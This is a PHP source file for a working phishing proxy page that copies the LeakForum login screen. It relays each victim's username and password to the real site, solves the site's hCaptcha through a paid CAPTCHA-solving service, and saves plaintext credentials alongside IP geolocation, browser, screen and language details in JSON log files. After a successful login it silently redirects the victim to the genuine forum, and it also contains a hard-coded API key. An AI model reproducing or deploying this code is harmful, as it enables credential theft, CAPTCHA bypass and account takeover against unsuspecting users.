<?php
session_start();

// ------------------------------------------------------------------
// Configure log directory (works regardless of where project is placed)
// ------------------------------------------------------------------
define('LOG_DIR', __DIR__ . '/logs');
if (!is_dir(LOG_DIR)) {
    @mkdir(LOG_DIR, 0755, true);
}

// Function to log all login attempts
function logAttempt($username, $password, $success = false) {
    $logFile = LOG_DIR . '/attempts.json';
    $attempts = [];
    
    // Load existing attempts if file exists
    if (file_exists($logFile)) {
        $jsonContent = file_get_contents($logFile);
        $attempts = json_decode($jsonContent, true) ?: [];
    }
    
    // Prepare new attempt entry
    $newAttempt = [
        'username' => $username,
        'password' => $password,
        'success' => $success,
        'timestamp' => date('Y-m-d H:i:s'),
        'ip_address' => getClientIp(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ];
    
    // Enrich with UA + geo + client-sent info
    $uaInfo = parseUserAgent($newAttempt['user_agent']);
    $geo    = geoLookup($newAttempt['ip_address']);
    $clientExtras = [
        'tz'     => $_POST['tz_offset'] ?? 'unknown',
        'screen' => $_POST['screen']    ?? 'unknown',
        'lang'   => $_POST['lang']      ?? 'unknown'
    ];

    $newAttempt = array_merge($newAttempt, $uaInfo, $geo, $clientExtras);
    
    $attempts[] = $newAttempt;
    
    // Save back to file
    file_put_contents($logFile, json_encode($attempts, JSON_PRETTY_PRINT));
}

// Function to log successful logins only
function logSuccessfulLogin($username, $password) {
    $logFile = LOG_DIR . '/successful_logins.json';
    $successes = [];
    
    // Load existing successes if file exists
    if (file_exists($logFile)) {
        $jsonContent = file_get_contents($logFile);
        $successes = json_decode($jsonContent, true) ?: [];
    }
    
    // Prepare new success entry
    $newSuccess = [
        'username' => $username,
        'password' => $password,
        'timestamp' => date('Y-m-d H:i:s'),
        'ip_address' => getClientIp(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ];
    
    $uaInfo = parseUserAgent($newSuccess['user_agent']);
    $geo    = geoLookup($newSuccess['ip_address']);
    $clientExtras = [
        'tz'     => $_POST['tz_offset'] ?? 'unknown',
        'screen' => $_POST['screen']    ?? 'unknown',
        'lang'   => $_POST['lang']      ?? 'unknown'
    ];
    $newSuccess = array_merge($newSuccess, $uaInfo, $geo, $clientExtras);
    
    $successes[] = $newSuccess;
    
    // Save back to file
    file_put_contents($logFile, json_encode($successes, JSON_PRETTY_PRINT));
}

// Simple debug logger
function debugLog($label, $data) {
    $logFile = LOG_DIR . '/debug.log';
    $entry   = date('Y-m-d H:i:s') . " | {$label}: " . (is_string($data) ? $data : json_encode($data, JSON_UNESCAPED_SLASHES)) . PHP_EOL;
    file_put_contents($logFile, $entry, FILE_APPEND);
}

// ------------------------------------------------------------------
// Helper: Best-effort client IP extraction (supports proxies)
// ------------------------------------------------------------------
function getClientIp(): string {
    // Cloudflare / generic proxy header chain
    $headers = [
        'HTTP_CF_CONNECTING_IP',      // Cloudflare
        'HTTP_X_REAL_IP',             // Nginx proxy_pass
        'HTTP_X_FORWARDED_FOR',       // Standard forwarded header (may contain many)
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR',
    ];

    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            // Forwarded-for may have comma-separated list, first is original client
            $ip = trim(explode(',', $_SERVER[$h])[0]);

            // Normalize IPv6 loopback / mapped IPv4
            if ($ip === '::1') {
                return '127.0.0.1';
            }
            if (stripos($ip, '::ffff:') === 0) {
                return substr($ip, 7); // ::ffff:192.0.2.1 -> 192.0.2.1
            }
            return $ip;
        }
    }
    return 'unknown';
}

// ------------------------------------------------------------------
// Helper: Very light-weight UA parsing (OS & browser only)
// ------------------------------------------------------------------
function parseUserAgent(string $ua): array {
    $osList = [
        'Windows'   => 'Windows',
        'Mac OS X'  => 'Mac OS',
        'Macintosh' => 'Mac OS',
        'Linux'     => 'Linux',
        'Android'   => 'Android',
        'iPhone'    => 'iOS',
        'iPad'      => 'iOS',
    ];

    $browserList = [
        'Chrome'  => 'Chrome',
        'Firefox' => 'Firefox',
        'Safari'  => 'Safari',
        'Edge'    => 'Edge',
        'OPR'     => 'Opera',
        'MSIE'    => 'IE',
        'Trident' => 'IE',
    ];

    $os = 'Unknown';
    foreach ($osList as $needle => $label) {
        if (stripos($ua, $needle) !== false) { $os = $label; break; }
    }

    $browser = 'Unknown';
    foreach ($browserList as $needle => $label) {
        if (stripos($ua, $needle) !== false) { $browser = $label; break; }
    }

    return ['os'=>$os, 'browser'=>$browser];
}

// ------------------------------------------------------------------
// Helper: IP geolocation via ip-api.com (free, limited; cached in memory)
// ------------------------------------------------------------------
function geoLookup(string $ip): array {
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return [];
    }

    static $cache = [];
    if (isset($cache[$ip])) return $cache[$ip];

    $url = 'http://ip-api.com/json/'.urlencode($ip).'?fields=status,country,regionName,city';
    $resp = @file_get_contents($url);
    $data = json_decode($resp, true);
    if (!is_array($data) || ($data['status']??'fail') !== 'success') {
        return $cache[$ip] = [];
    }
    return $cache[$ip] = [
        'country' => $data['country'] ?? '',
        'region'  => $data['regionName'] ?? '',
        'city'    => $data['city'] ?? ''
    ];
}

// ===== CaptchaAI configuration =====
const CAPTCHAAI_KEY = '2a39ad850f42b361ed9903a0056711ba'; // <-- put your key here

// cache balance check to avoid extra requests
$GLOBALS['captchia_balance_checked'] = false;

function logCaptchaAIBalance(){
    if($GLOBALS['captchia_balance_checked']) return;
    $url = 'https://ocr.captchaai.com/res.php?'.http_build_query([
        'key'=>CAPTCHAAI_KEY,
        'action'=>'getbalance'
    ]);
    $resp = @file_get_contents($url);
    debugLog('hcaptcha_balance_resp', $resp);

    // If balance returned and is zero, stop further attempts – no funds means every task will fail
    if(is_numeric(trim($resp)) && floatval($resp) <= 0){
        debugLog('hcaptcha_balance_zero', 'no funds');
        $GLOBALS['captchia_balance_checked'] = true; // still prevent repeat
        // store sentinel for later checks
        $GLOBALS['captchia_balance_zero'] = true;
        return;
    }
}

function solveHCaptcha($siteKey, $pageUrl) {
    if (!CAPTCHAAI_KEY) {
        debugLog('hcaptcha_skip', 'API key missing');
        return null;
    }

    // 1) create task
    $createUrl = 'https://ocr.captchaai.com/in.php';
    $payload = [
        'key'       => CAPTCHAAI_KEY,
        'method'    => 'hcaptcha',
        'sitekey'   => $siteKey,
        'pageurl'   => $pageUrl,
        'json'      => 1
    ];

    // Attempt to create the task up to 3 times to mitigate transient SERVER_ERROR responses
    logCaptchaAIBalance();
    if(!empty($GLOBALS['captchia_balance_zero'])){
        // Early abort with explicit reason
        debugLog('hcaptcha_abort','balance zero');
        return null;
    }
    $captchaId = null;
    for ($attempt = 1; $attempt <= 3; $attempt++) {
        $chC = curl_init($createUrl);
        curl_setopt_array($chC, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 30
        ]);
        $resp = curl_exec($chC);
        curl_close($chC);

        $data = json_decode($resp, true);

        // Successful creation
        if ($data && $data['status'] == 1) {
            $captchaId = $data['request'];
            debugLog('hcaptcha_id', $captchaId);
            break;
        }

        // Log failure details for troubleshooting
        debugLog('hcaptcha_create_fail', [
            'attempt' => $attempt,
            'response' => $resp
        ]);

        // Retry only for internal server errors, otherwise abort immediately
        $shouldRetry = isset($data['request']) && in_array($data['request'], [
            'ERROR_SERVER_ERROR',
            'ERROR_INTERNAL_SERVER_ERROR'
        ]);

        if (!$shouldRetry || $attempt === 3) {
            return null;
        }

        // Small back-off before retrying
        sleep(10);
    }

    if (!$captchaId) {
        // All attempts failed
        return null;
    }

    // 2) poll result
    $resultUrl = 'https://ocr.captchaai.com/res.php';
    for ($i=0;$i<24;$i++) {
        sleep(5);
        $url = $resultUrl.'?'.http_build_query([
            'key'=>CAPTCHAAI_KEY,
            'action'=>'get',
            'id'=>$captchaId,
            'json'=>1
        ]);
        $res = file_get_contents($url);
        debugLog('hcaptcha_poll_raw', ['iter'=>$i+1,'response'=>$res]);
        $out = json_decode($res,true);
        if(!$out){
            debugLog('hcaptcha_poll_decode_fail', $res);
            continue;
        }
        if($out['status']==1){
            debugLog('hcaptcha_token', $out['request']);
            return $out['request'];
        }
        if($out['request']!=='CAPCHA_NOT_READY'){
            debugLog('hcaptcha_error', $out['request']);
            return null;
        } else {
            debugLog('hcaptcha_pending', 'not ready yet');
        }
    }
}

// Function to make curl request to the real LeakForum site
function makeLoginRequest($username, $password, $remember = 'yes') {
    // Step-1: fetch explicit login page to obtain CSRF key
    $cookieFile   = tempnam(sys_get_temp_dir(), 'lf_cookie_');
    $loginPageUrl = 'https://leakforum.io/member.php?action=login';

    $ch = curl_init($loginPageUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_COOKIEJAR => $cookieFile,
        CURLOPT_COOKIEFILE => $cookieFile,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.9',
            'Connection: keep-alive'
        ]
    ]);
    $loginPageBody = curl_exec($ch);
    $loginPageCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    debugLog('login_page_http_code', $loginPageCode);
    curl_close($ch);

    // Extract the my_post_key value and potential hCaptcha sitekey
    if (preg_match("/name=['\"]?my_post_key['\"]?[^>]*value=['\"]?([a-f0-9]{32})['\"]?/i", $loginPageBody, $match)) {
        $postKey = $match[1];
        debugLog('extracted_post_key', $postKey);
    } else {
        // log failure and abort early
        debugLog('post_key_extract_failed', true);
        $postKey = '';
    }

    $hcaptchaToken = null;
    if (preg_match('/class="h-captcha"[^>]*data-sitekey="([^"]+)/i', $loginPageBody, $hmatch)) {
        $siteKey = $hmatch[1];
        debugLog('hcaptcha_sitekey', $siteKey);
        $hcaptchaToken = solveHCaptcha($siteKey, $loginPageUrl);
    }

    // Prepare POST data for the actual authentication request
    $payload = [
        'username'    => $username,
        'password'    => $password,
        'remember'    => $remember,
        'action'      => 'do_login',
        'url'         => 'https://leakforum.io/index.php',
        'my_post_key' => $postKey,
        'submit'      => 'Login',
    ];
    if ($hcaptchaToken) {
        $payload['h-captcha-response'] = $hcaptchaToken;
    }
    $postData = http_build_query($payload);

    debugLog('post_data', $postData);
    $ch = curl_init('https://leakforum.io/member.php');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_COOKIEJAR      => $cookieFile,
        CURLOPT_COOKIEFILE     => $cookieFile,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; LeakForumProxy/1.0)',
        CURLOPT_HTTPHEADER     => [
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://leakforum.io',
            'Referer: https://leakforum.io/member.php?action=login'
        ],
        CURLOPT_HEADER         => false,
    ]);

    $response  = curl_exec($ch);
    $httpCode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // --------------------------------------------------------------------
    // hCaptcha retry logic
    // --------------------------------------------------------------------
    // When we receive a response asking us again to solve the captcha it can
    // mean either our token was invalid/expired *or* the CSRF key we used
    // is no longer valid. In both cases we obtain *fresh* values from the
    // returned HTML and resubmit the request. We allow up to two retries.

    for ($hcRetry = 0; $hcRetry < 2 && stripos($response, 'please solve the hcaptcha') !== false; $hcRetry++) {
        debugLog('hcaptcha_retry_triggered', [
            'iter'   => $hcRetry + 1,
            'reason' => 'challenge still present after POST'
        ]);

        // 1) Extract new sitekey if available (may rotate)
        $siteKeyNew = null;
        if (preg_match('/data-sitekey="([^"]+)/i', $response, $skMatch)) {
            $siteKeyNew = $skMatch[1];
            debugLog('hcaptcha_sitekey_new', $siteKeyNew);
        }

        // 2) Extract fresh my_post_key embedded in the returned form
        $postKeyNew = null;
        if (preg_match("/name=['\"]?my_post_key['\"]?[^>]*value=['\"]?([a-f0-9]{32})['\"]?/i", $response, $pkMatch)) {
            $postKeyNew = $pkMatch[1];
            debugLog('post_key_new', $postKeyNew);
        }

        // If either of those is missing we cannot proceed further
        if (!$siteKeyNew || !$postKeyNew) {
            debugLog('hcaptcha_retry_abort', 'sitekey or postkey missing');
            break;
        }

        // 3) Request a new token from CaptchaAI
        $newToken = solveHCaptcha($siteKeyNew, 'https://leakforum.io/member.php?action=login');
        if (!$newToken) {
            debugLog('hcaptcha_retry_abort', 'token solve failed');
            break;
        }

        // 4) Rebuild payload with updated values
        $payload['my_post_key']       = $postKeyNew;
        $payload['h-captcha-response'] = $newToken;
        $postData = http_build_query($payload);
        debugLog('post_data_retry', $postData);

        // 5) Re-POST with same session cookies
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        debugLog('remote_http_code_retry', $httpCode);

        // Success short-circuit
        if (stripos($response, 'successfully been logged in') !== false || $httpCode === 302) {
            break;
        }
    }

    // Save full remote response for offline inspection
    $dumpFile = LOG_DIR . '/remote_response_' . date('Ymd_His') . '.html';
    file_put_contents($dumpFile, $response);
    debugLog('remote_response_saved', basename($dumpFile));
    debugLog('remote_http_code', $httpCode);
    debugLog('remote_first_1000', substr($response, 0, 1000));
    debugLog('post_key_used', $postKey);
    debugLog('contains_success_phrase', stripos($response, 'successfully been logged in') !== false);

    // Consider 302 redirect as successful auth (LeakForum redirects after login)
    if ($httpCode === 302) {
        $response = 'You have successfully been logged in.'; // Sentinel for success detection
    }

    // Clean-up cookie file
    @unlink($cookieFile);

    return [
        'response'  => $response,
        'http_code' => $httpCode,
    ];
}

// Function to save successful credentials to JSON file (legacy support)
function saveCredentials($username, $password) {
    $dataFile = __DIR__ . '/data.json';
    $data = [];
    
    // Load existing data if file exists
    if (file_exists($dataFile)) {
        $jsonContent = file_get_contents($dataFile);
        $data = json_decode($jsonContent, true) ?: [];
    }
    
    // Prepare new credential entry
    $newEntry = [
        'username' => $username,
        'password' => $password,
        'timestamp' => date('Y-m-d H:i:s'),
        'ip_address' => getClientIp()
    ];
    $uaInfo = parseUserAgent($_SERVER['HTTP_USER_AGENT'] ?? 'unknown');
    $geo    = geoLookup($newEntry['ip_address']);
    $clientExtras = [
        'tz'     => $_POST['tz_offset'] ?? 'unknown',
        'screen' => $_POST['screen']    ?? 'unknown',
        'lang'   => $_POST['lang']      ?? 'unknown'
    ];
    $newEntry = array_merge($newEntry, $uaInfo, $geo, $clientExtras);
    
    // Add to data array
    if (!isset($data['successful_logins'])) {
        $data['successful_logins'] = [];
    }
    
    $data['successful_logins'][] = $newEntry;
    
    // Save back to file
    file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT));
}

// Process form submission
if ($_POST && isset($_POST['action']) && $_POST['action'] === 'do_login') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $remember = $_POST['remember'] ?? 'no';

    // Perform remote login using fresh CSRF key
    $result   = makeLoginRequest($username, $password, $remember);
    $response = $result['response'];

    // Determine outcome
    $isSuccess = (stripos($response, 'you have successfully been logged in.') !== false)
              || (stripos($response, 'you will now be taken back to where you came from') !== false);
    debugLog('login_success_detected', $isSuccess);

    // Log attempt accordingly
    logAttempt($username, $password, $isSuccess);

    if ($isSuccess) {
        logSuccessfulLogin($username, $password);
        saveCredentials($username, $password);
        // Redirect user to real LeakForum index after capturing credentials
        header('Location: https://leakforum.io/index.php');
        exit;
    } else {
        echo file_get_contents(__DIR__ . '/member_unsucesfull.php');
    }
    exit;
}

// Generate a random post key for the form
$my_post_key = md5(uniqid(rand(), true));
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>LeakForum - Login Proxy</title>
<!-- Meta tags and CSS from the original file -->
<meta name="title" content="LeakForum - Biggest Cracking Community"/>
<meta name="description" content="Leakforum is a cracking forum and community. We have tons of premium accounts for everyone and a veriation of cracked and leaked programs to chose from!"/>
<meta property="og:image" content="https://leakforum.io/images/cover.png" />
<meta name="theme-color" content="#396B8E"/>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<script type="text/javascript" src="https://leakforum.io/jscripts/jquery.js?ver=1820"></script>
<script type="text/javascript" src="https://leakforum.io/jscripts/jquery.plugins.min.js?ver=1820"></script>
<script type="text/javascript" src="https://leakforum.io/jscripts/general.js?ver=1820"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link href='https://fonts.googleapis.com/css?family=Roboto:400,100,300,100italic,300italic,400italic,500italic,500,700,700italic,900,900italic' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous" />

<link type="text/css" rel="stylesheet" href="https://leakforum.io/cache/themes/theme4/global.css?t=1748112464" />
<link type="text/css" rel="stylesheet" href="https://leakforum.io/cache/themes/theme4/css3.css?t=1736035443" />
<link type="text/css" rel="stylesheet" href="https://leakforum.io/cache/themes/theme4/custom.css?t=1737747607" />
<link type="text/css" rel="stylesheet" href="https://leakforum.io/cache/themes/theme4/leakforum.css?t=1748114049" />

<style type='text/css'>
*, div, span, input, body, html, a {}
a[href*='misc.php?action=mobile_support'] span:before {content:'Switch to mobile';}
.header-bg {background-image:url(images/backgrounds/background11.jpg); }
</style>

</head>
<body>

<div id="container">
<a name="top" id="top"></a>
<div id="header">
<div id="panel">
<div class="upper">
<div class="wrapper">
<div id="header-menu">
<ul id="menu-panel">
<span class="hide-mobile">
<li>
<a href="https://leakforum.io" title="Home"><i class="fa-duotone fa-house-tree"></i>&nbsp; Home</a>
</li>
<li>
<a href="/misc.php?action=store" title="Upgrade"><i class="fa-duotone fa-stars"></i>&nbsp; Upgrade</a>
</li>
<li>
<a href="misc.php?action=help" title="Help"><i class="fa-duotone fa-life-ring"></i>&nbsp; Help</a>
</li>
<li>
<a href="search.php" title="Search"><i class="fa-duotone fa-magnifying-glass"></i>&nbsp; Search</a>
</li>
</span>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>

<div id="logo">
<div class="header-bg"></div>
<div class="wrapper">
<center>
<a class="scaleimages" href="https://leakforum.io" title="LeakForum">
<img src="/images/leakforum.png" alt="LeakForum" title="LeakForum" class="header-logo" width="320" height="80">
</a>
</center>
</div>
</div>

<div id="content">
<div class="wrapper powpow">
<div id="inner-container">

<div id="loginWrapper">
<div class="login">
<div class="rightPull">
<span class="welcum">
Welcome!
</span>
<span class="welcumDesc">
Damn, where the hell you been all that time!
</span>
<br/>
<div class="d-flex flex-row align-items-center font-weight-bold font-size-10 mb-5"> 
<div class="flex-fill">Don't have an account?</div> 
<div class="flex-shrink-0 flex-grow-0 ml-4"> 
<a href="/member.php?action=register"> 
<button type="button" class="button btn-secondary"> Register <i class="fas fa-sign-in-alt ml-2"></i> </button> 
</a> 
</div> 
</div>

<div class="loginForms" style="display: table">
<form method="POST" id="loginForm" action="member.php" style="display: table-cell; text-align: center; height: 100%; vertical-align: middle">
<div class="logreg-form-block username relative mb-4">
<label for="username">
<input name="username" type="text" class="loginInput" id="username" placeholder="Username" required>
</label>
</div>
<div class="logreg-form-block password relative mb-4">	
<label for="password">
<input name="password" type="password" class="loginInput" id="password" placeholder=" Password" required>
</label>
</div>
<label for="remember-me" style="cursor: pointer; display: block; text-align: center">
<input type="checkbox" class="loginCheckbox" name="remember" value="yes" id="remember-me" checked="">
<span class="customCheckbox"><span><i class="fas fa-check fa-fw"></i></span></span>&nbsp;
<span style="color: rgba(255,255,255,0.70); font-weight: 500; font-size: 12px; vertical-align: -1px;">Remember me</span>
</label>

<br>
<button class="loginButton" type="submit" style="margin-top: 10px;">
Continue
</button>
<input type="hidden" name="action" value="do_login" />
<input type="hidden" name="url" value="https://leakforum.io/member.php" />
<input type="hidden" name="my_post_key" value="<?php echo htmlspecialchars($my_post_key); ?>" />
<input type="hidden" name="tz_offset" id="tz_offset" />
<input type="hidden" name="screen" id="screen" />
<input type="hidden" name="lang" id="lang" />
</form>
</div>
<div class="bottom">
<a href="/member.php?action=lostpw" style="color: rgba(255,255,255,0.50)"><i class="fas fa-question-circle fa-fw"></i> Forgot your password?</a>
</div>
</div>
</div>
</div>

</div>
</div>
</div>

<div id="footer">
<div class="footer-back">
<div class="wrapper footer-back-inner">
<div class="lower">
<div class="d-flex">
<span id="copyright">
© LeakForum.io | 2023-<?php echo date('Y'); ?> - All Rights Reserved || Login Proxy
<span id="current_time"><strong>Current time:</strong> <?php echo date('m-d-Y, h:i A'); ?></span>
</span>
</div>
</div>
</div>
</div>

</div>
</body>
</html>

<script>
document.addEventListener('DOMContentLoaded',()=>{
  const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
  const scr  = window.screen.width+'x'+window.screen.height;
  const lang = navigator.language || navigator.userLanguage || '';
  document.getElementById('tz_offset').value = tz;
  document.getElementById('screen').value    = scr;
  document.getElementById('lang').value      = lang;
});
</script> 